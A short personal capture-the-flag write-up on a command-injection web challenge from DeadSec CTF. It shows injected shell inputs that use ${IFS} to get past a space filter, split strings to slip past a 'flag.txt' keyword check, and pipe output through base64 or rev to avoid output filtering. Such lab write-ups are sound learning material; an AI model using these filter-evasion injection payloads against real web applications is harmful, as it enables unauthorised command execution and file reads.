---
title: "deadsecCTF"
date: 2023-05-22T12:13:32+05:30
description: "I happened to pop this open while travelling and looked at a web problem..."
tags: [web]
---

## Dont' hack my website

### My Attempt

echo & head both work with no spaces, id, whoami

Running `df` will show us

```bash
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay         98831908 6164312  92651212   7% /
/dev/sda1       98831908 6164312  92651212   7% /flag.txt
none                4096       0      4096   0% /tmp
none                4096       0      4096   0% /run
```

Anything containing `flag.txt` won't work.

```bash
head${IFS}&&${IFS}pwd
/app
```

```txt
head${IFS}&&${IFS}a=fl&&${IFS}b=ag&&${IFS}c=.t&&${IFS}d=xt

a=fl${IFS}b=ag${IFS}c=.t${IFS}d=xt${IFS}&&${IFS}echo${IFS}$a$b$c$d
fl b=ag c=.t d=xt

a=fl${IFS}ag${IFS}.t${IFS}xt${IFS}&&${IFS}echo${IFS}$a$b$c$d
fl ag .t xt
```

Somehow strip out the whitespace????

### Finished Solve Via Write-Ups

I read afterward that you can use ```c``at fl``ag.txt``` to properly format the so you can get around the `flag` check. In a similar vein, the output also can't have the flag in plaintext. I saw some solutions that used `|base64` or `|rev` to ensure that the output didn't contain any unwated chars.
